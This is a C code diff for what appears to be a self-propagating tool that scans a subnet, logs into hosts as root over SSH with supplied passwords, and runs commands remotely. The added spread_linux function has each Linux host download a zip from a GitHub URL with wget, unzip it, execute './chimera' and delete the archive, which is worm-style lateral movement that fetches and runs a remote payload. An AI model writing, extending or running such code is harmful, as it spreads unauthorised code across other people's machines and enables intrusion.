@@ -9,9 +9,10 @@
  * @param command The command to execute on the remote host.
  * @param remote_os The operating system of the remote host.
  */
-void establish_connection(const char* host, const char* username, const char* password, const char* command, const enum os_type remote_os) {
+int establish_connection(const char* host, const char* username, const char* password, const char* command, const enum os_type remote_os) {
     char command_string[MAX_COMMAND_SIZE];
     int ret;
+    
     if(remote_os == LINUX) {
         #ifdef _WIN32
             ret = snprintf(command_string, sizeof(command_string), "echo y | %s -ssh %s -l %s -pw %s \"%s\"",
@@ -22,7 +23,7 @@ void establish_connection(const char* host, const char* username, const char* pa
         #endif
         if (ret >= sizeof(command_string)) {
             fprintf(stderr, "Command string too long\n");
-            return;
+            return -1;
         }
     } 
     // Construct the command string for a Windows host
@@ -38,20 +39,20 @@ void establish_connection(const char* host, const char* username, const char* pa
         #endif
         if (ret >= sizeof(command_string)) {
             fprintf(stderr, "Command string too long\n");
-            return;
+            return -1;
         }
     } 
     // Handle invalid operating system values
     else {
         fprintf(stderr, "Invalid operating system\n");
-        return;
+        return -1;
     }
 
     // Open a pipe to execute the command string and read the output
     FILE* fp = POPEN(command_string, "r");
     if (fp == NULL) {
         perror("popen");
-        return;
+        return -1;
     }
 
     // Read the output of the command line by line and print it
@@ -63,14 +64,62 @@ void establish_connection(const char* host, const char* username, const char* pa
     // Close the pipe and check for errors
     if (PCLOSE(fp) == -1) {
         perror("pclose");
-        return;
+        return -1;
     }
+    return 1;
 }
 
-
-static void spread_linux(const char* host, const char* username, const char* password, const char* command) {
-    // implementation for spreading to Linux host
+void spread_linux(const char* host, const char* username, const char* password) {
+    // Download the zip file from the URL
+    const char* url = "https://github.com/M00NLIG7/Chimera/raw/master/packaged.zip";
+    const char* filename = "packaged.zip";
+    char command_string[MAX_COMMAND_SIZE];
+    int ret;
     
+    // "curl -o packaged.zip https://github.com/M00NLIG7/Chimera/raw/master/packaged.zip"
+    
+    ret = snprintf(command_string, sizeof(command_string), "wget %s",url);
+    if (ret >= sizeof(command_string)) {
+        fprintf(stderr, "Command string too long\n");
+        return;
+    }
+
+    if (establish_connection(host, username, password, command_string, LINUX) > 0) {
+        return;
+    }
+
+    // Unzip the file on the remote Linux machine
+    ret = snprintf(command_string, sizeof(command_string), "unzip -o %s > /dev/null", filename);
+    if (ret >= sizeof(command_string)) {
+        fprintf(stderr, "Command string too long\n");
+        return;
+    }
+
+    if (establish_connection(host, username, password, command_string, LINUX) > 0) {
+        return;
+    }
+
+    // Run the command on the remote Linux machine
+    ret = snprintf(command_string, sizeof(command_string), "./chimera");
+    if (ret >= sizeof(command_string)) {
+        fprintf(stderr, "Command string too long\n");
+        return;
+    }
+
+    if (establish_connection(host, username, password, command_string, LINUX) > 0) {
+        return;
+    }
+
+    // Remove the zip file
+    ret = snprintf(command_string, sizeof(command_string), "rm -f %s", filename);
+    if (ret >= sizeof(command_string)) {
+        fprintf(stderr, "Command string too long\n");
+        return;
+    }
+
+    if (establish_connection(host, username, password, command_string, LINUX) > 0) {
+        return;
+    }
 }
 
 static void spread_windows(const char* host, const char* username, const char* password, const char* command) {
@@ -109,7 +158,7 @@ void spread(const char* subnet, const char* password, const char* command) {
         } else if (remote_os == LINUX) {
             // establish_connection(host, username, password, command);
             username = "root";
-            spread_linux(host, username, password, command);
+            spread_linux(host, username, password);
 
         } else if (remote_os == WINDOWS) {
             username = "root";
